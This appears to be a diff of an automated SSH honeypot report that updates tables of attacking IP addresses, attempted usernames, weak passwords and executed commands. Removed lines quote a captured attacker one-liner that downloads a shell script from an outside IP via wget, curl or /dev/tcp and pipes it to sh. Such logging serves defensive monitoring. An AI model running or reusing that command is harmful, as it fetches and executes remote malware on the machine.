@@ -13,52 +13,49 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 39.106.154.35 | 9676 |
-| 59.110.161.252 | 5241 |
-| 47.237.6.142 | 4648 |
-| 8.134.88.215 | 4417 |
-| 8.213.150.160 | 4184 |
-| 8.217.10.15 | 2057 |
-| 81.0.248.203 | 1345 |
-| 47.104.135.12 | 1204 |
-| 182.52.90.208 | 831 |
-| 8.130.102.128 | 338 |
+| 8.134.63.38 | 9875 |
+| 47.121.141.132 | 6674 |
+| 8.142.215.78 | 4539 |
+| 182.52.90.208 | 861 |
+| 47.253.163.160 | 467 |
+| 39.106.154.35 | 363 |
+| 8.130.102.128 | 238 |
+| 182.92.245.145 | 159 |
+| 106.13.226.135 | 152 |
+| 1.215.240.130 | 98 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 1260 |
-| app3 | 317 |
-| ubuntu | 110 |
-| admin | 100 |
-| test | 84 |
-| postgres | 81 |
-| sysadmin | 53 |
-| user | 47 |
-| iptv | 32 |
-| odoo | 27 |
+| root | 512 |
+| nagios | 510 |
+| agent | 509 |
+| 22 | 507 |
+| coolbean | 506 |
+| 111111 | 505 |
+| dale | 505 |
+| andy | 504 |
+| site | 504 |
+| andrew | 503 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 161 |
-| password | 58 |
-| 111111 | 53 |
-| P@ssw0rd | 49 |
-| root | 43 |
-| admin | 38 |
-| 123 | 32 |
-| 12345 | 29 |
-| test | 28 |
-| 1 | 21 |
+| password | 186 |
+| P@ssw0rd | 173 |
+| test | 116 |
+| 1qq2w3e4r5t | 98 |
+| 123456 | 83 |
+| 1 | 77 |
+| admin | 72 |
+| test123 | 70 |
+| 12345678 | 70 |
+| sysadmin | 69 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 182.92.153.226 | uname -s -m |
-| 5.182.211.148 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
-| 5.182.211.148 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
-| 182.92.219.129 | uname -s -m |
+| 182.92.245.145 | uname -s -m |
